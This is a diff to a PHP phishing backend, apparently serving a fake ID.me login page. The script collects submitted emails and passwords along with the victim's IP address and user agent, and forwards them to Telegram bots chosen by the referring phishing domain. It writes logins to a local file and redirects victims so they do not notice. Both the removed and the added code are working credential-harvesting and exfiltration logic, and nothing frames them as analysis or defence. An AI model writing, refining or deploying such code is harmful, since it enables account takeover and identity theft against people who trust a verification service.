@@ -43,46 +43,31 @@ $site_map = [
     ],
 ];
 
-$log_file = __DIR__ . '/submission_log.txt';
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$parsed = parse_url($referer);
+$domain = $parsed['host'] ?? 'unknown';
+$config = $site_map[$domain] ?? null;
 
-function logToFile($data, $file) {
-    $entry = "[" . date("Y-m-d H:i:s") . "] " . $data . "\n";
-    file_put_contents($file, $entry, FILE_APPEND);
+if (!$config) {
+    http_response_code(403);
+    exit("Unauthorized origin.");
 }
 
-function sendToBots($message, $bots) {
-    foreach ($bots as $bot) {
-        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
-        
-        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
-        $data = [
-            'chat_id' => $bot['chat_id'],
-            'text' => $message,
-            'parse_mode' => 'Markdown'
-        ];
-        
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $url,
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $data,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 30
-        ]);
-        curl_exec($ch);
-        curl_close($ch);
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $log_file = __DIR__ . "/logs/idme_logins.txt";
+    if (!file_exists(dirname($log_file))) {
+        mkdir(dirname($log_file), 0777, true);
     }
-}
 
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $referer = $_SERVER['HTTP_REFERER'] ?? '';
-    $parsed = parse_url($referer);
-    $domain = $parsed['host'] ?? 'unknown-origin';
-    
+    function log_entry($msg) {
+        global $log_file;
+        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
+    }
+
     $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
     $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
     $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';
-    
+
     $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
           $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
           $_SERVER['HTTP_X_FORWARDED'] ?? 
@@ -95,7 +80,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         $ips = explode(',', $ip);
         $ip = trim($ips[0]);
     }
-    
+
     $timestamp = date("Y-m-d H:i:s");
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     
@@ -107,20 +92,31 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
                "📡 *IP:* `$ip`\n" .
                "🕒 *Time:* $timestamp\n" .
                "🔍 *User Agent:* " . substr($user_agent, 0, 100);
-    
-    logToFile("[$domain] Email: $useremail | Pass: $userpassword | IP: $ip | UA: $user_agent", $log_file);
-    
-    if (isset($site_map[$domain])) {
-        $site_config = $site_map[$domain];
-        sendToBots($message, $site_config['bots']);
+
+    foreach ($config['bots'] as $bot) {
+        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
         
-        ob_end_clean();
-        header("Location: " . $site_config['redirect']);
-        exit;
-    } else {
-        logToFile("❌ Unauthorized domain: $domain", $log_file);
-        http_response_code(403);
-        exit("Unauthorized domain");
+        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
+        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];
+
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data,
+            CURLOPT_TIMEOUT => 30
+        ]);
+        $result = curl_exec($ch);
+        if (curl_error($ch)) {
+            log_entry("❌ Telegram error: " . curl_error($ch));
+        }
+        curl_close($ch);
     }
+
+    log_entry("[$domain] Login from $ip - Email: $useremail");
+
+    ob_end_clean();
+    header("Location: " . $config['redirect']);
+    exit;
 }
 ?>
